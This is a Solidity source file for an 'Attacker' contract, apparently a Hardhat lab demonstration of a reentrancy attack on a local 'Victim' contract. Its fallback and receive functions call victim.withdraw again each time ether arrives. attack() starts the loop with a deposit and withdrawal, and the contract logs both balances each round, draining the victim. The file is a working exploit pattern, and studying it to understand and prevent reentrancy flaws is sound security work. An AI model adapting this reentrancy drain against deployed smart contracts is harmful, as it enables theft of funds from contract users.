// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;
import "./Victim.sol";

import "hardhat/console.sol";

contract Attacker{
    uint number;
    Victim victim;

    constructor () payable{}

    fallback() external payable{
        if(msg.sender == address(victim)){
            number += 1;
            console.log('\nAttack times', number);
            console.log('Attacker balance', address(this).balance/(10**18));
            console.log('Victim balance', address(victim).balance/(10**18));
            console.log('-------------------------------------------------');
            victim.withdraw(address(this), 1 ether);
        }
    }

    receive() external payable{
        if(msg.sender == address(victim)){
            number += 1;
            console.log('\nAttack times', number);
            console.log('Attacker balance', address(this).balance/(10**18));
            console.log('Victim balance', address(victim).balance/(10**18));
            console.log('-------------------------------------------------');
            victim.withdraw(address(this), 1 ether);
        }
    }

    function setVictim(Victim _victim) public{
        victim = _victim;
    }

    function attack(uint _value) public{
        victim.deposit(_value);
        victim.withdraw(address(this), _value / 2);
    }

}